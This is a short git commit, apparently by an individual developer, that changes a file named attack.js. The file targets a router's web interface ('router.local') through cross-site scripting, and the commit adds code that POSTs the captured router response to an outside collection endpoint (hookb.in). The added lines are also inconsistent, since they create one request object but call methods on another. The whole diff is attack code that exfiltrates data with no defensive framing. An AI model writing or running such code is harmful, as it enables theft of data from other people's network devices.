640822c320acd7a384e914fcb2354507346e6e2f
Daniel Spencer <danielspencer305@hotmail.co.uk>
2022-03-02 17:42:26 -0500

    Update attack to forward response

--- attack.js
+++ attack.js
@@ -2,6 +2,9 @@ const ROUTER = "http://router.local";
 const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";
 
 function forwardResponse(res) {
+	let fwdxhr = new XMLHttpRequest();
+	xhr.open("POST", ENDPOINT, true);
+	xhr.send(res)
 }
 
 console.log('executing XSS');
